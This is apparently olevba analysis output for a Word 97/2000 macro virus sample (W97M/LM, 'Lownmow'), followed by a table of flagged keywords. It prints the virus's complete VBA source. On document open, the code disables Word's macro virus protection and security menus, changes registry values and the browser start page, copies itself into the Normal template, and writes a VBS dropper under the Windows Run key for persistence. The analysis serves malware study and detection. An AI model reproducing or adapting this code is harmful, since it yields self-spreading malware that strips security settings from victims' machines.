olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lownmow
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lownmow - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "LM Protection by SiR DySTyK?") <> "Yep !!" Then
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\", "Start Page") = "http://www.geocities.com/sir_dystyk/index.html"

        With System
            .PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "SiR DySTyK"
            .PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "LVC"
        End With
        
        If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security\", "Level") <> "" Then
            CommandBars("Macro").Controls("Security...").Enabled = (Rnd * 0)
        Else
            CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
            CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
            CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
        End If
        
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
        End With
        
        With Application
            .EnableCancelKey = wdCancelDisabled
            .UserName = "SiR DySTyK"
            .UserInitials = "SD"
            .UserAddress = "W97M/LM   >8)"
        End With
        
        If ThisDocument = ActiveDocument Then Set Infect = NormalTemplate Else Set Infect = ActiveDocument
        
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        
        Set Destination = Infect.VBProject.VBComponents.Item(1).CodeModule
        Destination.DeleteLines 1, Destination.CountOfLines
        Destination.AddfromString Vx
        
        If Infect = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
        
        Call RemoteInfect
End If
' W97M/LM: by SiR DySTyK [© 2000, LVC]
' Should spread under Word2000.
' God made him simple.
' Science made him God. - [ Lawnmower Man   >8) ]
End Sub
Private Sub HelpAbout()
    MsgBox "All I have to do is spread.." + Chr$(10) + "   I WILL survive !!   >8)" + Chr$(10) + Chr$(10) + "  -SiR DySTyK-", vbInformation + vbSystemModal, "W97M/LM"
    Dialogs(wdDialogHelpAbout).Show
End Sub
Private Sub RemoteInfect()
    On Error Resume Next
    
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "") = "C:\Windows\System\LM.sys.vbs"
    
    Open "C:\Windows\System\LM.sys" For Output As #1
        Print #1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfDeclarationLines)
    Close #1
    Open "C:\Windows\System\LM.sys.vbs" For Output As #1
        Print #1, "Set MW = WScript.CreateObject(""Word.Application"")"
        Print #1, "MW.Options.VirusProtection = (Rnd * 0)"
        Print #1, "MW.Options.SaveNormalPrompt = (Rnd * 0)"
        Print #1, "MW.Options.ConfirmConversions = (Rnd * 0)"
        Print #1, "Set LM = MW.NormalTemplate.VBProject.VBComponents(1)"
        Print #1, "LM.CodeModule.DeleteLines 1, LM.CodeModule.CountOfLines"
        Print #1, "LM.CodeModule.AddFromFile (""C:\Windows\System\LM.sys"")"
    Close #1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.geocities|URL                                          |
|          |.com/sir_dystyk/inde|                                             |
|          |x.html              |                                             |
|IOC       |sys.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

